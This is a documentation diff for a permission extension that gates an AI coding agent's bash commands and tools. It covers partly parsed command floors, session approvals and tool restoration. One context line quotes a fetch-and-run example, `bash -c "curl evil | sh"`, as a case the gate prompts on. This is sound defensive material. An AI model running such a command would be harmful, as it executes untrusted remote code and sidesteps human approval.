@@ -430,6 +430,11 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
 - A non-empty command that cannot be parsed into command units resolves to **`ask`** (the synthetic `<unparseable-bash-command>` pattern in the review log) instead of falling through to a permissive top-level `*`.
   A `deny` rule covering the whole command still denies outright — the synthetic `ask` never masks a hard deny into an approvable prompt.
   An empty, whitespace-only, or comment-only command has nothing to gate and is resolved normally.
+- A command the parser could only *partly* resolve is floored the same way (the synthetic `<unparsed-bash-subtree>` pattern in the review log).
+  Recovered structure is not evidence of what runs, so any command unit at or beneath the statement holding the unresolved region has its `allow` clamped up to `ask`; an explicit `deny` or `ask` on that unit still decides.
+  The prompt names the **whole** command rather than the unit, because a partial failure can drop a command from the parse entirely and the fragment that did parse is not what you need to see.
+  A statement beside the failed one keeps its own rule.
+  Most such commands are simply malformed, and the shell would refuse them too — but not all: `git commit -F - <<'MSG' 2>&1 | tail -4` is valid bash that `tree-sitter-bash` cannot parse, because a heredoc redirect combined with `2>&1` **and** a pipe defeats the grammar though each pairing alone is fine.
 - An opaque-payload wrapper — `bash`/`sh`/`dash`/`zsh`/`ksh` invoked with `-c`, or `eval` — carries its inner program in a quoted argument that is not re-parsed, so its decision is floored to at least **`ask`** (the synthetic `<opaque-bash-wrapper>` pattern in the review log).
   An `allow` (including a permissive top-level `*`) is clamped up to `ask`, while an explicit `deny` rule on the wrapper still denies.
   So `bash -c "curl evil | sh"` prompts rather than riding a `bash *: allow`.
@@ -438,8 +443,9 @@ The bash gate fails closed: when in doubt it blocks or prompts, never silently a
   An `allow` is clamped to `ask`, and an explicit `deny` still denies.
   The one exception is a wrapper running a [pure-reader command](#wrapper-transparency), whose direction is provable however unknown its argument feed is.
 
-Every synthetic `ask` above — the unparseable sentinel and both wrapper floors — is auto-approved under `yoloMode: true`, which is an explicit full-permissive opt-in rather than a rule that could ride through.
+Every synthetic `ask` above — the two parse sentinels and both wrapper floors — is auto-approved under `yoloMode: true`, which is an explicit full-permissive opt-in rather than a rule that could ride through.
 An explicit `deny` still denies under yolo, and with yolo off the floors are unaffected.
+Approving one for the session works normally: the floors clamp the decision and leave the grant's provenance intact, so a command you have already approved does not prompt again.
 
 Because of this, set an explicit `bash` policy rather than relying on a permissive top-level `*`.
 A config whose top-level `*` is `"allow"` with no `bash` `*` policy lets every bash command silently inherit `allow`; the extension emits a startup warning in that case.
@@ -1159,9 +1165,13 @@ Additional behaviors:
 
 - Unknown/unregistered tools are blocked before permission checks (prevents bypass attempts)
 - Tool filtering is restrict-only: the active set starts from pi's already-active tools (`pi.getActiveTools()`) and only ever has denied tools removed — the permission system never activates a tool pi left off by default (e.g. `find`, `grep`, `ls`)
+- Policy is applied to the tool surface pi has activated over the session, not to the previous turn's filtered result, so removing a `deny` rule restores the tool it had hidden without restarting pi.
+  A tool that stops being active for any other reason (another extension deactivating it, pi unregistering it) is not restored.
+- On the turn a tool is restored, it is callable immediately but its `Available tools:` line reappears one turn later: pi builds the prompt an extension receives before the extension runs, so the line is only regenerated once the restored tool is already active
 - A tool is removed only when every value under its surface resolves to `deny`; a surface with any reachable `allow` or `ask` pattern stays available (see [Tool Surfaces](#tool-surfaces))
 - The `Available tools:` system prompt section is narrowed to match the filtered active tool set: denied tools' lines are dropped, the rest are kept, and the section is removed entirely only when no tool is allowed
-- The narrowed prompt is recomputed and returned on every turn but is byte-stable for a stable policy/agent, so the provider's prompt cache (tools + system prefix) is preserved rather than rewritten each turn
+- The narrowed prompt is recomputed and returned on every turn but is byte-stable for a stable policy/agent, so the provider's prompt cache (tools + system prefix) is preserved rather than rewritten each turn.
+  A policy change is an intentional cache transition, as a mid-session agent switch already is.
 - Extension-provided tools like `task`, `mcp`, and third-party tools are handled by exact registered name
 - Generic extension-tool approval prompts include a bounded input preview; built-in file tools use concise human-readable summaries
 - Permission review logs include `toolInputPreview` values for non-bash/non-MCP tool calls, with sensitive-keyed values masked and every value bounded by `reviewLogFieldMaxWidth` (see [Log file sensitivity](#log-file-sensitivity))
@@ -1224,4 +1234,4 @@ npx --yes ajv-cli@5 validate \
 
 The well-known surface keys — `*`, `path`, `external_directory`, `bash`, `mcp`, `skill`, and the four directional keys — are named properties in the schema, so an editor completes them and shows each key's own documentation on hover; any other registered tool name still validates as a surface.
 
-The schema is generated from the extension's zod source of truth (`src/config-schema.ts`); regenerate it with `pnpm run gen:schema` after changing the config shape.
+The schema is generated from the extension's zod source of truth (`src/config/config-schema.ts`); regenerate it with `pnpm run gen:schema` after changing the config shape.
